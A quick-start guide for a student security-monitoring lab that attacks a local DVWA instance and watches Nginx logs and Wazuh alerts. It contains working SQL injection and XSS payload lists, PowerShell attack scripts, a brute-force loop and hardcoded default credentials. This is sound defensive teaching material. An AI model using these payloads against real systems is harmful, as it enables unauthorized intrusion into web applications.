# Mini SOC - Quick Start Attack & Monitoring Reference

Panduan cepat untuk melakukan attack testing dan monitoring dalam 5 menit.

---

## 🚀 5-Minute Quick Start

### Step 1: Prepare Your Workspace (30 seconds)

Open 3 PowerShell/Terminal windows:

**Terminal 1 - Monitoring Nginx Logs:**
```powershell
docker compose logs -f nginx
```

**Terminal 2 - Monitoring Wazuh Manager:**
```powershell
docker compose logs -f wazuh-manager
```

**Terminal 3 - Execute Attacks:** (Ready to paste commands)

---

### Step 2: Run First Attack (1 minute)

Paste this in Terminal 3:

```powershell
# Simple SQL Injection Attack
$payload = "admin' OR '1'='1"
$encoded = [System.Web.HttpUtility]::UrlEncode($payload)
Invoke-WebRequest "http://localhost:8080/vulnerabilities/sqli/?id=$encoded" -UseBasicParsing -ErrorAction SilentlyContinue
```

**What You'll See:**
- Terminal 1 → HTTP request in Nginx logs
- Terminal 2 → Alert generation in Wazuh
- (Wait 5-10 seconds)

---

### Step 3: Check Dashboard (2 minutes)

1. Open: **http://localhost:5601**
2. Username: **admin**
3. Password: **SecurePassword123!**
4. Click **Security Events**
5. You'll see your alert!

---

## 🎯 One-Liner Attack Commands

### SQL Injection - Single Line
```powershell
Invoke-WebRequest "http://localhost:8080/vulnerabilities/sqli/?id=$([System.Web.HttpUtility]::UrlEncode(\"admin' OR '1'='1\"))" -UseBasicParsing -ErrorAction SilentlyContinue
```

### XSS - Single Line
```powershell
Invoke-WebRequest "http://localhost:8080/vulnerabilities/xss_reflected/?name=$([System.Web.HttpUtility]::UrlEncode(\"<script>alert('XSS')</script>\"))" -UseBasicParsing -ErrorAction SilentlyContinue
```

### Brute Force - 5 Attempts
```powershell
1..5 | % { Invoke-WebRequest "http://localhost:8080/vulnerabilities/brute/" -Method POST -Body "username=admin&password=password$_&Login=Login" -UseBasicParsing -ErrorAction SilentlyContinue; Start-Sleep -s 2 }
```

---

## 📊 Comprehensive Attack Scripts

### Option 1: Use Pre-built Script (Easiest)
```powershell
# Navigate to project directory
cd C:\Users\danis\MiniSoC_Kelas-C_032-042-050

# Run the attack script
.\attack-windows.ps1

# Select option:
# 1 = SQL Injection
# 2 = XSS
# 3 = File Upload
# 4 = Brute Force
# 5 = All Attacks
```

### Option 2: Create Custom Attack Script
Create file `my-attack.ps1`:

```powershell
# Attack Configuration
$DVWA_URL = "http://localhost:8080"

# Attack 1: SQLi
Write-Host "Executing SQLi..." -ForegroundColor Yellow
$sqli = @(
    "admin' OR '1'='1",
    "1' UNION SELECT user(),database() --",
    "1 OR 1=1"
)

foreach ($payload in $sqli) {
    $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
    Invoke-WebRequest "$DVWA_URL/vulnerabilities/sqli/?id=$encoded" -UseBasicParsing -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

# Attack 2: XSS
Write-Host "Executing XSS..." -ForegroundColor Yellow
$xss = @(
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('xss')>"
)

foreach ($payload in $xss) {
    $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
    Invoke-WebRequest "$DVWA_URL/vulnerabilities/xss_reflected/?name=$encoded" -UseBasicParsing -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

Write-Host "All attacks completed! Check Dashboard..."
```

Run it:
```powershell
.\my-attack.ps1
```

---

## 👀 Real-time Monitoring Commands

### Monitor All Logs Together
```bash
docker compose logs -f
```

### Monitor Individual Services

#### See Nginx Access Logs (Attack Origin)
```bash
docker compose logs -f nginx
```

#### See Wazuh Alerts Being Generated
```bash
docker compose logs -f wazuh-manager
```

#### See Filebeat Sending Logs
```bash
docker compose logs -f filebeat
```

---

## 🔍 View Logs Inside Containers

### Access Nginx Logs Directly
```bash
# Live tail
docker compose exec nginx tail -f /var/log/nginx/access.log

# Last 50 lines
docker compose exec nginx tail -50 /var/log/nginx/access.log

# Search for specific pattern
docker compose exec nginx grep "sqli" /var/log/nginx/access.log
```

### Access Wazuh Alerts Directly
```bash
# Live tail (JSON alerts)
docker compose exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json

# Pretty print JSON (readable)
docker compose exec wazuh-manager cat /var/ossec/logs/alerts/alerts.json | jq .

# Count alerts
docker compose exec wazuh-manager wc -l /var/ossec/logs/alerts/alerts.json
```

### Access Wazuh Manager Logs
```bash
# See all messages and alerts
docker compose exec wazuh-manager tail -f /var/ossec/logs/ossec.log

# Search for errors
docker compose exec wazuh-manager grep "ERROR" /var/ossec/logs/ossec.log
```

---

## 📈 Dashboard Walkthrough

### Access Dashboard
- **URL**: http://localhost:5601
- **Username**: admin
- **Password**: SecurePassword123!

### Navigate to Alerts
```
1. Click "Modules" (left menu)
2. Search for "Security Events"
3. Click it
4. You'll see all alerts
```

### View Specific Alert
```
1. See list of alerts
2. Click on any alert
3. View:
   - Source IP: 127.0.0.1
   - Destination URL: /vulnerabilities/sqli/
   - Payload: admin' OR '1'='1
   - Rule: 100100 (SQLi Detection)
   - Severity: HIGH
```

### Filter Alerts
- By Rule ID (100100 = SQLi, 100200 = XSS)
- By Source IP
- By Time Range
- By Severity Level

---

## 🔄 Full Attack-to-Alert Timeline

```
T+0s:  You execute: Invoke-WebRequest (attack command)
       ↓
T+1s:  Nginx receives HTTP request
       ↓
T+2s:  Nginx logs the request to /var/log/nginx/access.log
       ↓
T+3s:  Filebeat reads the log file
       ↓
T+4s:  Filebeat sends log to Wazuh Manager (port 1514)
       ↓
T+5s:  Wazuh Manager receives log
       ↓
T+6s:  Wazuh analyzes log against rules
       ↓
T+7s:  Rule matches! Alert generated
       ↓
T+8s:  Alert written to /var/ossec/logs/alerts/alerts.json
       ↓
T+9s:  Filebeat picks up alert
       ↓
T+10s: Alert indexed to Elasticsearch
       ↓
T+11s: VISIBLE in Dashboard!
```

---

## 🎓 Learning Scenarios

### Scenario 1: Simple Detection (5 min)
```
1. Terminal 1: docker compose logs -f nginx
2. Terminal 2: docker compose logs -f wazuh-manager
3. Terminal 3: Run 1 SQLi attack
4. Watch:
   - Nginx: Shows request
   - Wazuh: Generates alert
5. Dashboard: See the alert
```

### Scenario 2: Pattern Detection (10 min)
```
1. Monitor Dashboard
2. Run 5 SQLi attacks in sequence
3. Observe: Alert pattern/threshold crossing
4. Dashboard shows: Spike in SQL Injection attempts
```

### Scenario 3: Incident Timeline (15 min)
```
1. Dashboard in main window
2. Run: SQLi → Wait → XSS → Wait → Brute Force
3. Dashboard shows:
   - Attack progression
   - Different rule IDs
   - Attack origin (IP)
   - Timeline correlation
```

---

## 🔧 Troubleshooting Commands

### Check if DVWA is Running
```powershell
Invoke-WebRequest http://localhost:8080 -UseBasicParsing
# Should return: StatusCode 200
```

### Check if Wazuh is Running
```powershell
Invoke-WebRequest http://localhost:55000/version -Credential (New-Object System.Management.Automation.PSCredential("wazuh", (ConvertTo-SecureString "wazuh" -AsPlainText -Force))) -UseBasicParsing
# Should return: "version": "..."
```

### Check Container Status
```bash
docker compose ps
# All should show "Up"
```

### View Recent Errors
```bash
docker compose logs --tail 50 | grep ERROR
```

---

## 📝 Common Payloads

### SQL Injection
```
admin' OR '1'='1
1' UNION SELECT user(),database() --
1' AND 1=2 UNION SELECT user(),database(),database() --
1' OR 'a'='a
' OR 1=1 --
```

### XSS
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
```

### Brute Force
```
Username: admin
Passwords: password, 12345, admin123, letmein, welcome, Password1
```

---

## 🎯 What to Look For in Logs

### Nginx Access Log Pattern
```
127.0.0.1 - - [25/Apr/2026:10:35:20] "GET /vulnerabilities/sqli/?id=admin%27%20OR%20%271%27%3D%271"
                                       └─ URL encoded payload
```

### Wazuh Alert Pattern (JSON)
```json
{
  "timestamp": "2026-04-25T10:35:25.123+0000",
  "rule": {
    "id": 100100,
    "level": 10,
    "description": "SQL Injection Attack Detected",
    "groups": ["webapp", "sqli"]
  },
  "data": {
    "srcip": "127.0.0.1",
    "url": "/vulnerabilities/sqli/?id=admin' OR '1'='1"
  }
}
```

---

## 💡 Pro Tips

1. **Start Simple**: Do 1 SQLi, understand entire flow first
2. **Use 3 Terminals**: Nginx + Wazuh + Attack execution
3. **Time the Attacks**: 5-10 seconds between attacks
4. **Dashboard is Best**: Gives visual overview of everything
5. **Check Timeline**: See progression of attack-to-alert
6. **Try Variations**: Different payloads = different alerts
7. **Monitor Metrics**: Count alerts, see patterns
8. **Use Grep**: Search Docker logs for specific patterns

---

## 📞 Quick Commands Reference

| What | Command |
|------|---------|
| **Start System** | `docker compose up -d` |
| **Stop System** | `docker compose down` |
| **View All Logs** | `docker compose logs -f` |
| **View Nginx Logs** | `docker compose logs -f nginx` |
| **View Wazuh Logs** | `docker compose logs -f wazuh-manager` |
| **Open Dashboard** | Browser: `http://localhost:5601` |
| **Run Attack Script** | `.\attack-windows.ps1` |
| **Check DVWA** | `Invoke-WebRequest http://localhost:8080` |
| **Live Alerts** | `docker compose exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json` |

---

**Ready to test? Start with Step-by-Step Quick Start above! 🚀**
